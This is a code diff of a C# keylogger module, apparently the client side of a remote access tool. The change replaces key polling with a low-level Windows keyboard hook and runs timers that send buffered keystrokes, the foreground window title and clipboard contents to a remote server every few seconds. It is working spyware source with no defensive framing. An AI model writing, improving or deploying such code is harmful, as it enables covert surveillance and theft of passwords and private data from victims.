@@ -1,197 +1,151 @@
-﻿using System;
+﻿using System.Collections.Concurrent;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
+using System.Windows.Forms;
 using Client.Conexion;
 
 namespace Client
 {
     static class Keylogger
     {
+        // Hook
+        private static IntPtr _hookId = IntPtr.Zero;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static Thread _hookThread;
+
+        // Buffer y envío
+        private static readonly ConcurrentQueue<string> _queue = new ConcurrentQueue<string>();
+        private static System.Threading.Timer _sendTimer;
+
+        // Active window
+        private static System.Threading.Timer _windowTimer;
+
+        // Clipboard
+        private static System.Threading.Timer _clipboardTimer;
+        private static string _lastClipboard = "";
+
+        // P/Invoke
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
+            IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
         [DllImport("user32.dll")]
         private static extern IntPtr GetForegroundWindow();
-
-        [DllImport("user32.dll")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         [DllImport("user32.dll")]
         private static extern int GetAsyncKeyState(Int32 i);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        private static extern IntPtr OpenClipboard(IntPtr hWndNewOwner);
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        private static bool shiftPresionado = (GetAsyncKeyState(160) & 0x8000) != 0 || (GetAsyncKeyState(161) & 0x8000) != 0;
 
-        [DllImport("user32.dll")]
-        private static extern bool CloseClipboard();
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr GetClipboardData(uint uFormat);
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GlobalLock(IntPtr handle);
-
-        [DllImport("kernel32.dll")]
-        private static extern bool GlobalUnlock(IntPtr handle);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        private static extern IntPtr GlobalAlloc(uint uFlags, uint dwBytes);
-
-        private static StringBuilder _buffer = new StringBuilder();
-        private static Timer _keyTimer;
-        private static Timer _sendTimer;
-        private static Timer _clipboardTimer;
-        private static Timer _activeWindowTimer;
-        private static DateTime _lastKeyPressTime = DateTime.MinValue;
-        private static readonly TimeSpan _keyPressDelay = TimeSpan.FromMilliseconds(30);  // Para evitar duplicados de teclas.
-        private static bool _isKeyLoggingInProgress = false;
-
-
-        public static void start()
+        public static void Start()
         {
-            // Configurar el temporizador para captura de teclas (100 ms)
-            _keyTimer = new Timer(CaptureKeys, null, 0, 86);  // Intervalo más corto para captura de teclas
-            // Configurar el temporizador para el envío del buffer (2 segundos)
-            _sendTimer = new Timer(SendBuffer, null, 0, 3000);  // No iniciar aún
-            // Configurar el temporizador para monitorizar el portapapeles (cada 1 segundo)
-            _clipboardTimer = new Timer(SendClipboard, null, 0, 5000);  // No iniciar aún
-            // Configurar el temporizador para monitorizar la ventana activa (cada 1 segundo)
-            _activeWindowTimer = new Timer(SendActiveWindow, null, 0, 3000);  // No iniciar aún
-        }
-
-        public static void stop()
-        {
-            // Detener los temporizadores
-            _keyTimer?.Change(Timeout.Infinite, Timeout.Infinite);  // Detener captura de teclas
-            _sendTimer?.Change(Timeout.Infinite, Timeout.Infinite);  // Detener envío de buffer
-            _clipboardTimer?.Change(Timeout.Infinite, Timeout.Infinite);
-            _activeWindowTimer?.Change(Timeout.Infinite, Timeout.Infinite);
-            // Limpiar el buffer
-            _buffer.Clear();
-        }
-
-        private static void SendBuffer(object state)
-        {
-            lock (_buffer)
+            // Arrancar el hook en un hilo STA con message loop
+            _hookThread = new Thread(() =>
             {
-                if (_buffer.Length == 0)
-                    return;
+                _hookId = SetHook(_proc);
+                Application.Run(); // Mantiene vivo el hook
+            });
+            _hookThread.SetApartmentState(ApartmentState.STA);
+            _hookThread.IsBackground = true;
+            _hookThread.Start();
 
-                // Enviar el contenido del buffer al servidor
-                ClientSocket.SendResponse("KEYLOG:" + _buffer.ToString());
-                _buffer.Clear();  // Limpiar el buffer tras el envío
-            }
-
-            // Después de enviar, activar el temporizador para el siguiente envío
-            _sendTimer.Change(3000, Timeout.Infinite);  // 3 segundos para el siguiente envío
-        }
-
-        private static void SendActiveWindow(object state)
-        {
-            ClientSocket.SendResponse("ACTWNDW:" + getActiveWindowsTitle());
-
-            // Después de enviar, activar el temporizador para el siguiente envío
-            _activeWindowTimer.Change(1000, Timeout.Infinite);  // 1 segundo para el siguiente envío
-        }
-
-        private static void SendClipboard(object state)
-        {
-            ClientSocket.SendResponse("CLPBRD:" + GetClipboardText());
-
-            // Después de enviar, activar el temporizador para el siguiente envío
-            _clipboardTimer.Change(1300, Timeout.Infinite);  // 1.3 segundos para el siguiente envío
-        }
-
-        private static void CaptureKeys(object state)
-        {
-            if (_isKeyLoggingInProgress)
-                return;
-
-            _isKeyLoggingInProgress = true;
-
-            for (int key = 0; key < 255; key++)
+            // Timer de envío cada 2s
+            _sendTimer = new System.Threading.Timer(_ =>
             {
-                if ((GetAsyncKeyState(key) & 0x8000) != 0)
+                if (!_queue.IsEmpty)
                 {
-                    string k = verificarTecla(key);
-                    if (!string.IsNullOrEmpty(k))
-                    {
-                        if (DateTime.Now - _lastKeyPressTime > _keyPressDelay)
-                        {
-                            lock (_buffer)
-                            {
-                                _buffer.Append(k);
-                            }
-                            _lastKeyPressTime = DateTime.Now;
-                        }
-                    }
+                    var sb = new StringBuilder();
+                    while (_queue.TryDequeue(out var s))
+                        sb.Append(s);
+                    var payload = sb.ToString();
+                    if (payload.Length > 0)
+                        ClientSocket.SendResponse(payload, Channel.Keylogger);
                 }
-            }
+            }, null, 2000, 2000);
 
-            _keyTimer.Change(85, Timeout.Infinite);  // Reinicia el temporizador
-
-            _isKeyLoggingInProgress = false;
-        }
-
-        private static string GetClipboardText()
-        {
-            string clipboardText = string.Empty;
-
-            try
+            // Timer ventana activa cada 3s
+            _windowTimer = new System.Threading.Timer(_ =>
             {
-                // Abrir el portapapeles
-                if (OpenClipboard(IntPtr.Zero) != IntPtr.Zero)
+                string title = GetActiveWindowTitle();
+                ClientSocket.SendResponse(title, Channel.ActiveWindow);
+            }, null, 0, 3000);
+
+            // Timer clipboard cada 5s
+            _clipboardTimer = new System.Threading.Timer(_ =>
+            {
+                var clip = GetClipboardText();
+                if (!string.IsNullOrEmpty(clip) && clip != _lastClipboard)
                 {
-                    // Obtener el handle de los datos en formato CF_TEXT
-                    IntPtr hData = GetClipboardData(13);  // 13 es el formato CF_TEXT
-                    if (hData != IntPtr.Zero)
-                    {
-                        // Bloquear los datos para obtener el puntero
-                        IntPtr pointer = GlobalLock(hData);
-                        if (pointer != IntPtr.Zero)
-                        {
-                            // Convertir el puntero a una cadena completa
-                            clipboardText = Marshal.PtrToStringAnsi(pointer);
-                            GlobalUnlock(hData);
-                        }
-                    }
-                    CloseClipboard();
+                    _lastClipboard = clip;
+                    ClientSocket.SendResponse(clip, Channel.Clipboard);
                 }
-            }
-            catch (Exception ex)
-            {
-                // Manejar cualquier excepción (por ejemplo, si no se puede acceder al portapapeles)
-                Console.WriteLine($"Error al acceder al portapapeles: {ex.Message}");
-            }
-
-            return clipboardText;
+            }, null, 0, 5000);
         }
 
-        private static string getActiveWindowsTitle()
+        public static void Stop()
         {
-            IntPtr hwnd = GetForegroundWindow();
-            StringBuilder windowTitle = new StringBuilder(256);
-            if (GetWindowText(hwnd, windowTitle, windowTitle.Capacity))
+            if (_hookId != IntPtr.Zero)
             {
-                return windowTitle.ToString();
+                UnhookWindowsHookEx(_hookId);
+                _hookId = IntPtr.Zero;
             }
-            return "Desconocida";
+            if (_hookThread != null)
+            {
+                Application.ExitThread(); // Para el message loop
+                _hookThread = null;
+            }
+            _sendTimer?.Dispose();
+            _windowTimer?.Dispose();
+            _clipboardTimer?.Dispose();
+            while (_queue.TryDequeue(out _)) { }
         }
 
-        private static string verificarTecla(int code)
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            // Verificamos si la tecla Shift está presionada (código 160 o 161)
-            bool shiftPresionado = (GetAsyncKeyState(160) & 0x8000) != 0 || (GetAsyncKeyState(161) & 0x8000) != 0;
+            using var curProc = Process.GetCurrentProcess();
+            using var curMod = curProc.MainModule;
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                GetModuleHandle(curMod.ModuleName), 0);
+        }
 
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                string s = VkCodeToString(vkCode);
+                if (!string.IsNullOrEmpty(s))
+                    _queue.Enqueue(s);
+            }
+            return CallNextHookEx(_hookId, nCode, wParam, lParam);
+        }
+
+
+        private static string VkCodeToString(int code)
+        {
+            bool shift = (Control.ModifierKeys & Keys.Shift) != 0;
             // Letras
             if (code >= 65 && code <= 90)
-            {
-                return shiftPresionado ? ((char)code).ToString() : ((char)code).ToString().ToLower(); // Mayúsculas si Shift está presionado
-            }
-
-            // Números (sin Shift)
+                return shift ? ((char)code).ToString() :
+                    ((char)(code + 32)).ToString();
+            // Números
             if (code >= 48 && code <= 57)
                 return ((char)code).ToString();
-
-            // Caracteres especiales con o sin Shift
+            // Teclas especiales
             return code switch
             {
                 13 => "[Enter]",  // Enter
@@ -206,10 +160,10 @@ namespace Client
                 222 => shiftPresionado ? "\"" : "'", // Comillas dobles o simples
                 189 => shiftPresionado ? "_" : "-", // Guion bajo o guion
                 187 => shiftPresionado ? "+" : "=", // Más o igual
-                192 => shiftPresionado ? "~" : "`", // Tilde o acento grave
+                192 => shiftPresionado ? "~" : "", // Tilde o acento grave
                 219 => shiftPresionado ? "{" : "[", // Llave izquierda o corchete izquierdo
                 220 => shiftPresionado ? "|" : "\\", // Barra vertical o barra invertida
-                226 => shiftPresionado ? "\"`" : "~", // Tilde inversa o barra
+                226 => shiftPresionado ? "\"" : "~", // Tilde inversa o barra
                 33 => "!",         // Exclamación "!"
                 64 => "@",         // Arroba "@"
                 35 => "#",         // Numeral "#"
@@ -224,6 +178,30 @@ namespace Client
                 43 => "+",         // Más "+"
                 _ => ""            // Otros códigos no mapeados
             };
+        }
+
+        private static string GetActiveWindowTitle()
+        {
+            IntPtr hwnd = GetForegroundWindow();
+            var sb = new StringBuilder(256);
+            if (GetWindowText(hwnd, sb, sb.Capacity) > 0)
+                return sb.ToString();
+            return "";
+        }
+
+        private static string GetClipboardText()
+        {
+            string text = null;
+            var t = new Thread(() =>
+            {
+                try { text = Clipboard.GetText(); }
+                catch { /* Acceso fallido */ }
+            });
+            t.SetApartmentState(ApartmentState.STA);
+            t.IsBackground = true;
+            t.Start();
+            t.Join(500);
+            return text ?? "";
         }
     }
 }
